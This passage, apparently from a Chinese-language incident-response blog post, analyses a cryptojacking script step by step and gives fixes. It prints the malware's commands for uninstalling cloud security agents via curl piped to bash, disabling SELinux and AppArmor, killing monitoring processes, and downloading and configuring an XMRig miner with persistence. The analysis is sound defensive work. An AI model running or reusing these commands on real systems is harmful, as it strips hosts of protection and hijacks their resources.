<span class="line"><span>rm -rf /tmp/keys</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决方法" tabindex="-1"><a class="header-anchor" href="#解决方法"><span>解决方法</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>vi /etc/sysctl.conf</span></span>
<span class="line"><span>kernel.nmi_watchdog=0 去掉</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo &#39;1&#39; &gt; /proc/sys/kernel/nmi_watchdog</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_6-关闭某云的安全软件" tabindex="-1"><a class="header-anchor" href="#_6-关闭某云的安全软件"><span>6.关闭某云的安全软件</span></a></h2><h3 id="恶意代码-5" tabindex="-1"><a class="header-anchor" href="#恶意代码-5"><span>恶意代码：</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>if ps aux | grep -i &#39;[a]liyun&#39;; then</span></span>
<span class="line"><span>  curl http://update.aegis.aliyun.com/download/uninstall.sh | bash</span></span>
<span class="line"><span>  curl http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash</span></span>
<span class="line"><span>  pkill aliyun-service</span></span>
<span class="line"><span>  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service</span></span>
<span class="line"><span>  rm -rf /usr/local/aegis*</span></span>
<span class="line"><span>  systemctl stop aliyun.service</span></span>
<span class="line"><span>  systemctl disable aliyun.service</span></span>
<span class="line"><span>  service bcm-agent stop</span></span>
<span class="line"><span>  yum remove bcm-agent -y</span></span>
<span class="line"><span>  apt-get remove bcm-agent -y</span></span>
<span class="line"><span>elif ps aux | grep -i &#39;[y]unjing&#39;; then</span></span>
<span class="line"><span>  /usr/local/qcloud/stargate/admin/uninstall.sh</span></span>
<span class="line"><span>  /usr/local/qcloud/YunJing/uninst.sh</span></span>
<span class="line"><span>  /usr/local/qcloud/monitor/barad/admin/uninstall.sh</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if [ -f /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh ]; then</span></span>
<span class="line"><span>  /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh stop &amp;&amp; /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh remove &amp;&amp; rm -rf /usr/local/cloudmonitor  </span></span>
<span class="line"><span>else</span></span>
<span class="line"><span>  export ARCH=amd64</span></span>
<span class="line"><span>  if [ -f /usr/local/cloudmonitor/CmsGoAgent.linux-\${ARCH} ]; then</span></span>
<span class="line"><span>    /usr/local/cloudmonitor/CmsGoAgent.linux-\${ARCH} stop &amp;&amp; /usr/local/cloudmonitor/CmsGoAgent.linux-\${ARCH} uninstall &amp;&amp; rm -rf /usr/local/cloudmonitor </span></span>
<span class="line"><span>  else</span></span>
<span class="line"><span>    echo &quot;ali cloud monitor not running&quot;</span></span>
<span class="line"><span>  fi</span></span>
<span class="line"><span>fi</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决-2" tabindex="-1"><a class="header-anchor" href="#解决-2"><span>解决</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>这条没有生效，某的监控还是在运行</span></span>
<span class="line"><span></span></span>
<span class="line"><span># ps aux | grep -i &#39;[a]liyun&#39;</span></span>
<span class="line"><span>root     13457  0.5  0.2 101296  8900 ?        S&lt;sl Mar31 1000:29 /usr/local/aegis/aegis_client/aegis_11_55/AliYunDun</span></span>
<span class="line"><span>root     13467  1.7  0.7 145768 26980 ?        S&lt;sl Mar31 3579:27 /usr/local/aegis/aegis_client/aegis_11_55/AliYunDunMonitor</span></span>
<span class="line"><span>root     15055  0.0  0.1  43464  4528 ?        S&lt;sl May15 121:01 /usr/local/aegis/aegis_update/AliYunDunUpdate</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_7-禁用selinux-以及关闭aliyun-service" tabindex="-1"><a class="header-anchor" href="#_7-禁用selinux-以及关闭aliyun-service"><span>7.禁用SELinux 以及关闭aliyun.service</span></a></h2><h3 id="恶意代码-6" tabindex="-1"><a class="header-anchor" href="#恶意代码-6"><span>恶意代码：</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>setenforce 0</span></span>
<span class="line"><span>echo SELINUX=disabled &gt;/etc/selinux/config</span></span>
<span class="line"><span>service apparmor stop</span></span>
<span class="line"><span>systemctl disable apparmor</span></span>
<span class="line"><span>service aliyun.service stop</span></span>
<span class="line"><span>systemctl disable aliyun.service</span></span>
<span class="line"><span>ps aux | grep -v grep | grep &#39;aegis&#39; | awk &#39;{print $2}&#39; | xargs -I % kill -9 %</span></span>
<span class="line"><span>ps aux | grep -v grep | grep &#39;Yun&#39; | awk &#39;{print $2}&#39; | xargs -I % kill -9 %</span></span>
<span class="line"><span>rm -rf /usr/local/aegis</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>解释</p><h3 id="解决-3" tabindex="-1"><a class="header-anchor" href="#解决-3"><span>解决</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>setenforce 0</span></span>
<span class="line"><span>echo SELINUX=disabled &gt;/etc/selinux/config</span></span>
<span class="line"><span>都是</span></span>
<span class="line"><span>恢复之前的文件：</span></span>
<span class="line"><span></span></span>
<span class="line"><span># vi /etc/selinux/config</span></span>
<span class="line"><span></span></span>
<span class="line"><span>SELINUX=disabled</span></span>
<span class="line"><span>SELINUXTYPE=targeted</span></span>
<span class="line"><span></span></span>
<span class="line"><span>systemctl disable apparmor</span></span>
<span class="line"><span>恢复，本机没有安装，所以不生效。</span></span>
<span class="line"><span>systemctl status apparmor</span></span>
<span class="line"><span>systemctl enable apparmor</span></span>
<span class="line"><span></span></span>
<span class="line"><span>service aliyun.service stop</span></span>
<span class="line"><span>systemctl disable aliyun.service</span></span>
<span class="line"><span>恢复：</span></span>
<span class="line"><span>systemctl start aliyun.service</span></span>
<span class="line"><span>systemctl status aliyun.service</span></span>
<span class="line"><span>systemctl enable aliyun.service</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>aegis目录没有被删掉。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span># ll /usr/local/aegis</span></span>
<span class="line"><span>total 28</span></span>
<span class="line"><span>drwxr-xr-x 5 root root 4096 Mar 31 21:31 aegis_client</span></span>
<span class="line"><span>srwxr-xr-x 1 root root    0 Mar 31 21:31 Aegis-&lt;Guid(5A2C30A2-A87D-490A-9281-6765EDAD7CBA)&gt;</span></span>
<span class="line"><span>drwxr-xr-x 3 root root 4096 May 15 11:50 aegis_update</span></span>
<span class="line"><span>drwxr-xr-x 3 root root 4096 Feb 10  2023 AliSecGuard</span></span>
<span class="line"><span>drwxr-xr-x 5 root root 4096 Aug 17 11:55 globalcfg</span></span>
<span class="line"><span>drwxr-xr-x 8 root root 4096 Aug 17 13:24 PythonLoader</span></span>
<span class="line"><span>drwxr-xr-x 7 root root 4096 Apr 24 10:18 PythonLoaderTemp</span></span>
<span class="line"><span>drwxr-xr-x 3 root root 4096 Dec 19  2021 SecureCheck</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_8-安装-mining-脚本" tabindex="-1"><a class="header-anchor" href="#_8-安装-mining-脚本"><span>8.安装 mining 脚本</span></a></h2><h3 id="恶意代码-7" tabindex="-1"><a class="header-anchor" href="#恶意代码-7"><span>恶意代码</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>#set up RR mining script</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if [ &quot;$(id -u)&quot; == &quot;0&quot; ]; then</span></span>
<span class="line"><span>  echo &quot;WARNING: Generally it is not adviced to run this script under root&quot;</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span>WALLET=123456789abcd #做了处理</span></span>
<span class="line"><span>EMAIL=$1 # this one is optional</span></span>
<span class="line"><span></span></span>
<span class="line"><span># active 1GB pages</span></span>
<span class="line"><span>sysctl -w vm.nr_hugepages=$(nproc)</span></span>
<span class="line"><span></span></span>
<span class="line"><span>for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);</span></span>
<span class="line"><span>do</span></span>
<span class="line"><span>    echo 3 &gt; &quot;$i/hugepages/hugepages-1048576kB/nr_hugepages&quot;;</span></span>
<span class="line"><span>done</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo &quot;1GB pages successfully enabled&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># checking prerequisites</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if [ -z $WALLET ]; then</span></span>
<span class="line"><span>  echo &quot;Script usage:&quot;</span></span>
<span class="line"><span>  echo &quot;&gt; setup_rr_miner.sh &lt;wallet address&gt; [&lt;your email address&gt;]&quot;</span></span>
<span class="line"><span>  echo &quot;ERROR: Please specify your wallet address&quot;</span></span>
<span class="line"><span>  exit 1</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span>WALLET_BASE=\`echo $WALLET | cut -f1 -d&quot;.&quot;\`</span></span>
<span class="line"><span>if [ \${#WALLET_BASE} != 95 -a \${#WALLET_BASE} != 34 ]; then</span></span>
<span class="line"><span>  echo &quot;ERROR: Wrong wallet base address length (should be 95 or 34): \${#WALLET_BASE}&quot;</span></span>
<span class="line"><span>  exit 1</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if [ -z $RRHOME ]; then</span></span>
<span class="line"><span>  echo &quot;ERROR: Please define HOME environment variable to your home directory&quot;</span></span>
<span class="line"><span>  exit 1</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if [ ! -d $RRHOME ]; then</span></span>
<span class="line"><span>  echo &quot;ERROR: Please make sure HOME directory $RRHOME exists or set it yourself using this command:&quot;</span></span>
<span class="line"><span>  echo &#39;  export RRHOME=&lt;dir&gt;&#39;</span></span>
<span class="line"><span>  exit 1</span></span>
<span class="line"><span>fi</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解释" tabindex="-1"><a class="header-anchor" href="#解释"><span>解释：</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>#set up RR mining script</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if [ &quot;$(id -u)&quot; == &quot;0&quot; ]; then</span></span>
<span class="line"><span>  echo &quot;WARNING: Generally it is not adviced to run this script under root&quot;</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>判断用户如果是root，弹出警告，不建议用root用户运行。</span></span>
<span class="line"><span></span></span>
<span class="line"><span>WALLET=123456789abcd #做了处理</span></span>
<span class="line"><span>EMAIL=$1 # this one is optional</span></span>
<span class="line"><span></span></span>
<span class="line"><span># active 1GB pages</span></span>
<span class="line"><span>sysctl -w vm.nr_hugepages=$(nproc)</span></span>
<span class="line"><span></span></span>
<span class="line"><span>for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);</span></span>
<span class="line"><span>do</span></span>
<span class="line"><span>    echo 3 &gt; &quot;$i/hugepages/hugepages-1048576kB/nr_hugepages&quot;;</span></span>
<span class="line"><span>done</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo &quot;1GB pages successfully enabled&quot;</span></span>
<span class="line"><span>这段代码的目的是在系统上启用 1GB 大页面（Huge Pages），以提高大内存工作负载的性能和效率。它通过设置 Huge Pages 数目并针对每个 NUMA 节点进行配置来实现这一目标。这可能是在进行内存优化和性能调整时使用的一部分脚本。</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span># checking prerequisites</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if [ -z $WALLET ]; then</span></span>
<span class="line"><span>  echo &quot;Script usage:&quot;</span></span>
<span class="line"><span>  echo &quot;&gt; setup_rr_miner.sh &lt;wallet address&gt; [&lt;your email address&gt;]&quot;</span></span>
<span class="line"><span>  echo &quot;ERROR: Please specify your wallet address&quot;</span></span>
<span class="line"><span>  exit 1</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>这段代码用于检查用户在执行脚本时是否提供了有效的钱包地址（通过检查变量 $WALLET 是否为空）。如果用户未提供钱包地址，脚本将输出使用说明和示例命令，并输出错误消息，然后终止执行。这有助于确保脚本在正确的输入参数下才会继续执行，避免因缺少必要的信息而导致问题。</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>WALLET_BASE=\`echo $WALLET | cut -f1 -d&quot;.&quot;\`</span></span>
<span class="line"><span>if [ \${#WALLET_BASE} != 95 -a \${#WALLET_BASE} != 34 ]; then</span></span>
<span class="line"><span>  echo &quot;ERROR: Wrong wallet base address length (should be 95 or 34): \${#WALLET_BASE}&quot;</span></span>
<span class="line"><span>  exit 1</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>这段代码用于检查给定的钱包地址的基本部分的长度是否符合要求。如果长度既不是 95 也不是 34，脚本将输出错误消息，并终止执行。</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if [ -z $RRHOME ]; then</span></span>
<span class="line"><span>  echo &quot;ERROR: Please define HOME environment variable to your home directory&quot;</span></span>
<span class="line"><span>  exit 1</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>这段代码用于检查是否定义了环境变量 $RRHOME，并在该变量未定义时输出错误消息，然后终止执行</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if [ ! -d $RRHOME ]; then</span></span>
<span class="line"><span>  echo &quot;ERROR: Please make sure HOME directory $RRHOME exists or set it yourself using this command:&quot;</span></span>
<span class="line"><span>  echo &#39;  export RRHOME=&lt;dir&gt;&#39;</span></span>
<span class="line"><span>  exit 1</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>跟上一段差不多。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决-4" tabindex="-1"><a class="header-anchor" href="#解决-4"><span>解决</span></a></h3><p>基本只是检查条件，不需要安全操作</p><h2 id="_9-安装curl-wget" tabindex="-1"><a class="header-anchor" href="#_9-安装curl-wget"><span>9.安装curl, wget</span></a></h2><p>如果没有安装则安装 curl, wget</p><h3 id="恶意代码-8" tabindex="-1"><a class="header-anchor" href="#恶意代码-8"><span>恶意代码</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>#check curl, wget</span></span>
<span class="line"><span>if ! command -v curl &amp;&gt; /dev/null</span></span>
<span class="line"><span>then</span></span>
<span class="line"><span>    echo &quot;curl could not be found, will install...&quot;</span></span>
<span class="line"><span>    apt-get install curl -y</span></span>
<span class="line"><span>    yum install curl -y</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>if ! command -v wget &amp;&gt; /dev/null</span></span>
<span class="line"><span>then</span></span>
<span class="line"><span>    echo &quot;wget could not be found, will install...&quot;</span></span>
<span class="line"><span>    apt-get install wget -y</span></span>
<span class="line"><span>    yum install wget -y</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if ! type lscpu &gt;/dev/null; then</span></span>
<span class="line"><span>  echo &quot;WARNING: This script requires \\&quot;lscpu\\&quot; utility to work correctly&quot;</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>这段代码用于检查是否安装了名为 lscpu 的命令行工具。如果未安装，脚本将输出警告消息，提醒用户脚本需要该工具才能正常运行。</span></span>
<span class="line"><span># lscpu -V</span></span>
<span class="line"><span># lscpu from util-linux 2.23.2</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if ! sudo -n true 2&gt;/dev/null; then</span></span>
<span class="line"><span>  echo &quot;Since I can&#39;t do passwordless sudo, mining in background will started from your $RRHOME/.profile file first time you login this host after reboot.&quot;</span></span>
<span class="line"><span>else</span></span>
<span class="line"><span>  echo &quot;Mining in background will be performed using moneroocean_miner systemd service.&quot;</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>这段代码用于检查是否可以进行无密码 sudo，根据结果输出不同的消息。如果无法进行无密码 sudo，则说明后台挖矿将在用户首次登录主机后通过 .profile 文件启动。如果可以进行无密码 sudo，则说明后台挖矿将使用 systemd 服务来执行。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决-5" tabindex="-1"><a class="header-anchor" href="#解决-5"><span>解决</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>无需操作</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="_10-安装挖矿软件" tabindex="-1"><a class="header-anchor" href="#_10-安装挖矿软件"><span>10.安装挖矿软件</span></a></h2><h3 id="恶意代码和解释" tabindex="-1"><a class="header-anchor" href="#恶意代码和解释"><span>恶意代码和解释</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span># start doing stuff: preparing miner</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo &quot;[*] Removing previous rr miner (if any)&quot;</span></span>
<span class="line"><span>if sudo -n true 2&gt;/dev/null; then</span></span>
<span class="line"><span>  sudo systemctl stop xmrig.service</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>killall -9 xmrig</span></span>
<span class="line"><span></span></span>
<span class="line"><span>这段代码用于移除之前可能存在的 RR 矿工（RiskReward 矿工），首先尝试通过无密码 sudo 停止相关的 systemd 服务（如果条件成立），然后通过 killall 命令强制终止 xmrig 进程。</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo &quot;[*] Looking for the latest version of Xmrig miner&quot;</span></span>
<span class="line"><span>LATEST_XMRIG_LINUX_RELEASE=&quot;https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-static-x64.tar.gz&quot;</span></span>
<span class="line"><span>echo &quot;[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz&quot;</span></span>
<span class="line"><span>if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then</span></span>
<span class="line"><span>  echo &quot;ERROR: Can&#39;t download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz&quot;</span></span>
<span class="line"><span>  exit 1</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>这段代码用于从指定的链接下载最新版本的 Xmrig 矿工软件，将其保存到临时文件 /tmp/xmrig.tar.gz。如果下载失败，脚本将输出错误消息并终止执行。</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo &quot;[*] Unpacking /tmp/xmrig.tar.gz to $RRHOME&quot;</span></span>
<span class="line"><span>if ! tar xf /tmp/xmrig.tar.gz -C $RRHOME --strip=1; then</span></span>
<span class="line"><span>  echo &quot;WARNING: Can&#39;t unpack /tmp/xmrig.tar.gz to $RRHOME directory&quot;</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>rm /tmp/xmrig.tar.gz</span></span>
<span class="line"><span></span></span>
<span class="line"><span>这段代码用于解压缩下载的 Xmrig 矿工软件并将其放置到指定目录 $RRHOME 中。如果解压缩失败，脚本将输出警告消息。</span></span>
<span class="line"><span></span></span>
<span class="line"><span>chmod +x $RRHOME/xmrig</span></span>
<span class="line"><span>chmod +x $RRHOME/config.json</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo &quot;[*] Miner $RRHOME/xmrig is OK&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>sed -i &#39;s/&quot;url&quot;: *&quot;[^&quot;]*&quot;,/&quot;url&quot;: &quot;XXX.XXXXXXX.com:5555&quot;,/&#39; $RRHOME/config.json</span></span>
<span class="line"><span>sed -i &#39;s/&quot;1gb-pages&quot;: *false,/&quot;1gb-pages&quot;: true,/&#39; $RRHOME/config.json</span></span>
<span class="line"><span>sed -i &#39;s/&quot;algo&quot;: *null,/&quot;algo&quot;: &quot;gr&quot;,/&#39; $RRHOME/config.json</span></span>
<span class="line"><span>sed -i &#39;s/&quot;tls&quot;: *false,/&quot;tls&quot;: true,/&#39; $RRHOME/config.json</span></span>
<span class="line"><span>sed -i &#39;s/&quot;keepalive&quot;: *false,/&quot;keepalive&quot;: true,/&#39; $RRHOME/config.json</span></span>
<span class="line"><span>sed -i &#39;s/&quot;user&quot;: *&quot;[^&quot;]*&quot;,/&quot;user&quot;: &quot;&#39;$WALLET&#39;.0x22&quot;,/&#39; $RRHOME/config.json</span></span>
<span class="line"><span>sed -i &#39;s/&quot;max-cpu-usage&quot;: *[^,]*,/&quot;max-cpu-usage&quot;: 100,/&#39; $RRHOME/config.json</span></span>
<span class="line"><span>sed -i &#39;s#&quot;log-file&quot;: *null,#&quot;log-file&quot;: &quot;&#39;$RRHOME/xmrig.log&#39;&quot;,#&#39; $RRHOME/config.json</span></span>
<span class="line"><span>sed -i &#39;s/&quot;syslog&quot;: *[^,]*,/&quot;syslog&quot;: true,/&#39; $RRHOME/config.json</span></span>
<span class="line"><span>sed -i &#39;s/&quot;max-threads-hint&quot;: *[^,]*,/&quot;max-threads-hint&quot;: 75,/&#39; $RRHOME/config.json</span></span>
<span class="line"><span>sed -i &#39;s/&quot;max-threads-hint&quot;: *[^,]*,/&quot;max-threads-hint&quot;: 75,/&#39; $RRHOME/config_background.json</span></span>
<span class="line"><span># 修改配置文件</span></span>
<span class="line"><span></span></span>
<span class="line"><span>cp $RRHOME/config.json $RRHOME/config_background.json</span></span>
<span class="line"><span>sed -i &#39;s/&quot;background&quot;: *false,/&quot;background&quot;: true,/&#39; $RRHOME/config_background.json</span></span>
<span class="line"><span></span></span>
<span class="line"><span># preparing script</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo &quot;[*] Creating $RRHOME/miner.sh script&quot;</span></span>
<span class="line"><span>cat &gt;$RRHOME/miner.sh &lt;&lt;EOL</span></span>
<span class="line"><span>#!/bin/bash</span></span>
<span class="line"><span>if ! pidof xmrig &gt;/dev/null; then</span></span>
<span class="line"><span>  nice $RRHOME/xmrig \\$*</span></span>
<span class="line"><span>else</span></span>
<span class="line"><span>  echo &quot;RAPTOREUM miner is already running in the background. Refusing to run another one.&quot;</span></span>
<span class="line"><span>  echo &quot;Run \\&quot;killall xmrig\\&quot; or \\&quot;sudo killall xmrig\\&quot; if you want to remove background miner first.&quot;</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>EOL</span></span>
<span class="line"><span></span></span>
